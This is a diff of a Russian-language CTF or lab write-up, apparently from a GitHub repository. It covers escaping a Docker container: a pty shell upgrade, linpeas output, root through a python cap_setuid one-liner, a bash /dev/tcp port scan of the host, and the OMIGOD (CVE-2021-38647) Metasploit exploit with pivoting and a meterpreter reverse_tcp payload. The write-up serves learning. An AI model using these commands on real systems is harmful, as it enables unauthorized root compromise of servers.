@@ -70,10 +70,130 @@ Payload options (linux/x64/meterpreter/reverse_tcp):
 ```
 и ловим реверсшелл за daemon
 
-### ВЫХОД ИЗ ДОКЕРА
+### ВЗЯТИЕ РУТА
 по базе сначала апгрейдим шелл и оглядываемся вокруг (```python3 -c 'import pty; pty.spawn("/bin/bash")'```). по названию машины можно сразу предположить, что мы в контейнере 
 ```
 daemon@4a70924bafa0:/bin$ df -h и видела:
-overlay 19G 5.9G 12G 34% /   (это специфическая файловая система, которую Docker использует для объединения слоев образа (того самого «пирога», о котором я говорил раньш). Видишь корень (/) на overlay — ты в контейнере.)
-```'
-```for port in 22 80 443 5985 5986 8080; do ( (echo < /dev/tcp/172.17.0.1/$port) &>/dev/null && echo "Порт $port ОТКРЫТ" ) & done; wait```
+overlay 19G 5.9G 12G 34% /   (это специфическая файловая система, которую Docker использует для объединения слоев образа. корень (/) на overlay - мы в контейнере)
+```
+попробуем установить линпис в папку /tmp (можно через питоновский сервер, можно через мсфконсоль). подгружается! (значит, на тачке не норм настроены привилегии(скорее всего нет аппармора), плюс стоит что-то вроде ```root filesystem mode rw```, а тк не ro, то можно не париться с выполнением кода через оперативную память). даем линпису права на исполнение и запускаем его. вывод скрипта подтверждает предположение. также из нтересного
+```
+╔══════════╣ Docker Container details (T1613)
+═╣ Am I inside Docker group ....... No                                                                   
+═╣ Looking and enumerating runtime sockets:
+═╣ Docker version ................. Not Found                                                            
+═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                            
+═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                            
+═╣ Vulnerable to CVE-2021-41091 ... Not Found                                                            
+═╣ Rootless Docker? ............... No // докер демон с правами рута!!!!                                                                  
+
+╔══════════╣ Container & breakout enumeration (T1611)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/index.html     
+═╣ Container ID ................... 4a70924bafa0═╣ Container Full ID .............. 4a70924bafa01a7b3f78dd2d91f4cfcadaec99422c17a1de88900fb3d39b3906
+══╣ Hardening & isolation (T1611)
+═╣ Seccomp mode ................... filtering (2)                                                        
+═╣ NoNewPrivs ..................... disabled (0)
+═╣ AppArmor profile ............... docker-default (enforce)
+═╣ SELinux status ................. disabled
+═╣ User namespace mappings ....... initial user namespace // рут в контейнере = рут на хосте
+```
+эта связка нам дает возможность выйти из контейнера с правами рута (плюс, в теории, мы сможем эксплуатировать ядро)
+```
+Режим Docker	               User Namespace	               Результат после побега (Breakout)
+Rootless no                      Initial                     ROOT (Полный захват сервера)
+Rootless no                      Mapped               	    Обычный юзер (UID 100000, нужно снова повышать права)
+Rootless	yes                     Всегда Mapped	             Обычный юзер (Тот, кто запустил докер)
+```
+также из интересного - линпис подсветил быстренький способ повыситься до рута
+```
+Files with capabilities (limited to 50):
+/usr/bin/python3.7 = cap_setuid+ep
+```
+видим, что у питона в капабилитис стоит право менять uid. ну, раз для нас расщедрились - воспользуемся
+
+```
+/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+и вот, мы теперь полноправный рут! (забавно, что вся система нас видит как суперюзера, хотя и запертого в контейнере)
+
+### ВЫХОД ИЗ КОНТЕЙНЕРА
+
+в ```/proc/mounts``` у нас нет проброшенных с хоста папок(типа /dev/sdb1), через lsblk (удивительно, что работает) мы можем увидеть структуру сервера, через ```capsh --print``` - что у нас нет cap_sys_admin и монтировать директории мы не можем, docker.sock у нас не проброшен - стандартные варианты не работа.ь. значит, попробуем просканировать хост на наличие видимых из контейнера портов 
+```
+root@4a70924bafa0:/etc/skel# route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
+```
+видим, что адрес хоста 172.17.0.1. для начала попробуем просканировать его (вообще, по добру надо было бы сканировать всю подсеть, но в таком задании вряд ли это потребуется). вообще, можно, наверное, перекинуть бинарник нмапа, но решила написать скрипт на баше (сделала его скользящим, чтобы не повесить контейнер и не попасть под горячую руку oom killer'а, плюс чтобы не зависать на отфильтрованных фаерволлом портах). 
+```bash -c 'MAX_THREADS=50; for port in {1..10000}; do while [ $(jobs -rp | wc -l) -ge $MAX_THREADS ]; do sleep 0.1; done; ( (echo < /dev/tcp/172.17.0.1/$port) &>/dev/null && echo "Порт $port ОТКРЫТ" ) & done; wait'```
+видим вывод
+```
+Порт 22 ОТКРЫТ
+Порт 80 ОТКРЫТ
+Порт 5986 ОТКРЫТ
+```
+бинго! на 5986 порту обычно висит служба OMI (Open Management Infrastructure) — проект от Microsoft, грубо говоря, это инструмент, который позволяет администраторам удаленно управлять линукс-серверами (вообще, не факт, что версия уязвима, но как вектор атаки - вполне возможно сработает)
+
+суть: можно обратиться по данному порту и попросить сервер выполнить определенную команду, при этом служба проверяет заголовок Authorization в запросе. если там правильный логин и пароль — выполняет. 
+
+уязвимость omigod: если отправить запрос на выполнение команды и вообще удалить заголовок Authorization из запроса, то кривой код на языке C (на котором написан OMI) сходит с ума
+из-за ошибки программистов, если заголовка нет вообще, переменная проверки аутентификации просто остается пустой (или равной нулю). а в Linux UID=0 — это root, и оми выполняет все с правами рута
+
+эксплойт решила запустить через msfconsole
+```
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   ...
+   3  exploit/linux/misc/cve_2021_38647_omigod   2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
+   4    \_ target: Unix Command                  .                .          .      .
+   5    \_ target: Linux Dropper                 .                .          .      .
+
+msf exploit > use 3
+msf exploit(linux/misc/cve_2021_38647_omigod) > route add 172.17.0.0 255.255.255.0 1 // пивотинг(использование взломанной машины, чтобы дотянуться до других,
+видных ей). команда говорит типа: «если я захочу отправить пакеты в сеть 172.17.0.x, пропихни их через сессию 1»
+...
+Module options (exploit/linux/misc/cve_2021_38647_omigod):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
+                                         Supported proxies: socks5, socks5h, sapni, http, socks4
+   RHOSTS     172.17.0.1       yes       The target host(s), see https://docs.metasploit.com/docs/using
+                                         -metasploit/basics/using-metasploit.html
+   RPORT      5986             yes       The target port (TCP)
+   SRVHOST                     no        The local host to listen on and use for incoming connections
+   SRVSSL     true             no        Negotiate SSL/TLS for local server connections
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generate
+                                         d)
+   TARGETURI  /wsman           yes       Base path
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVPORT  8080             yes       The local port to listen on
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  your_ip          yes       The listen address (an interface may be specified)
+   LPORT  5555             yes       The listen port
+
+
+```
+пишем ```run```, запускаем эксплойт и ловим рута на хосте!😎 
+<img width="374" height="112" alt="image" src="https://github.com/user-attachments/assets/96626f29-d585-4ae3-809b-5a68d0274a2d" />
+
+p.s. в итоге даже сайт не посмотрела ведь апхпхапх
